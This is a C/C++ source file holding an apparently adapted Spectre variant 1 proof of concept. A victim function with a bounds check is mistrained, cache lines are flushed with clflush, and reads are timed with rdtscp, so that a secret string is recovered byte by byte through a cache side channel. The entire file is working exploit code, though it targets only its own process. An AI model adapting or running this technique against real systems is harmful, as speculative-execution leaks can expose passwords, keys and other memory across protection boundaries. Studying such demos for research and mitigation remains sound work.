#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <x86intrin.h> /* for rdtscp and clflush */
#include <string>

/********************************************************************
Victim code.
********************************************************************/
const int NUM_PAGES = 512;
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[16] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t unused2[64];
uint8_t array2[NUM_PAGES * 512];

char* secret = "I Love Minecraft";

uint8_t temp = 0; /* Used so compiler won't optimize out victim_function() */

void victim_function(size_t x)
{
	if (x < array1_size)
	{
		temp &= array2[array1[x] * 512];
	}
}

/********************************************************************
Analysis code
********************************************************************/
#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, int32_t value[2], int32_t score[2])
{
	static int results[NUM_PAGES];
	int tries, i, j, k, mix_i;
	unsigned int junk = 0;
	size_t training_x, x;
	register uint64_t time1, time2;
	volatile uint8_t* addr;

	for (i = 0; i < NUM_PAGES; i++)
		results[i] = 0;

	for (tries = 999; tries > 0; tries--)
	{
		/* Flush array2[256*(0..255)] from cache */
		for (i = 0; i < NUM_PAGES; i++)
			_mm_clflush(&array2[i * 512]); /* intrinsic for clflush instruction */

		/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
		training_x = tries % array1_size;
		for (j = 29; j >= 0; j--)
		{
			_mm_clflush(&array1_size);
			for (volatile int z = 0; z < 100; z++)
			{
			} /* Delay (can also mfence) */

			/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
			/* Avoid jumps in case those tip off the branch predictor */
			x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
			x = (x | (x >> 16)); /* Set x=-1 if j%6=0, else x=0 */
			x = training_x ^ (x & (malicious_x ^ training_x));

			/* Call the victim! */
			victim_function(x);
		}

		/* Time reads. Order is lightly mixed up to prevent stride prediction */
		for (i = 0; i < NUM_PAGES; i++)
		{
			mix_i = ((i * 167) + 13) & 255;
			addr = &array2[mix_i * 512];
			time1 = __rdtscp(&junk); /* READ TIMER */
			junk = *addr; /* MEMORY ACCESS TO TIME */
			time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
			if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
				results[mix_i]++; /* cache hit - add +1 to score for this value */
		}

		/* Locate highest & second-highest results results tallies in j/k */
		j = k = -1;
		for (i = 0; i < NUM_PAGES; i++)
		{
			if (j < 0 || results[i] >= results[j])
			{
				k = j;
				j = i;
			}
			else if (k < 0 || results[i] >= results[k])
			{
				k = i;
			}
		}
		if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
			break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
	}
	results[0] ^= junk; /* use junk so code above won't get optimized out*/
	value[0] = j;
	score[0] = results[j];
	value[1] = k;
	score[1] = results[k];
}

int main(int argc, const char* * argv)
{
	printf("Putting '%s' in memory, address %p\n", secret, (void *)(secret));
	size_t malicious_x = (size_t)(secret - (char *)array1); /* default for malicious_x */

	printf("secret = %p\n", secret);
	printf("array1 = %p\n", array1);
	printf("malicious_x = %p\n", (char*)malicious_x);
	int32_t score[2], len = strlen(secret);
	int32_t value[2];

	for (size_t i = 0; i < sizeof(array2); i++)
		array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
	// if (argc == 3)
	// {
	// 	sscanf(argv[1], "%p", (void * *)(&malicious_x));
	// 	malicious_x -= (size_t)array1; /* Convert input value into a pointer */
	// 	sscanf(argv[2], "%d", &len);
	// 	printf("Trying malicious_x = %p, len = %d\n", (void *)malicious_x, len);
	// }

	auto secret_message = std::string{};
	secret_message.reserve(len);

	printf("Reading %d bytes:\n", len);
	while (--len >= 0)
	{
		// printf("Reading at malicious_x = %p... ", (void *)malicious_x);
		readMemoryByte(malicious_x++, value, score);
		secret_message += (char)value[0];
		// printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
		// printf("0x%02X='%c' score=%d ", value[0],
		//        (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
		// if (score[1] > 0)
		// 	printf("(second best: 0x%02X='%c' score=%d)", value[1],
		// 		   (value[1] > 31 && value[1] < 127 ? value[1] : '?'),
		// 		   score[1]);
		// printf("\n");
	}
	printf("Secret: %s\n", secret_message.c_str());
	return (0);
}
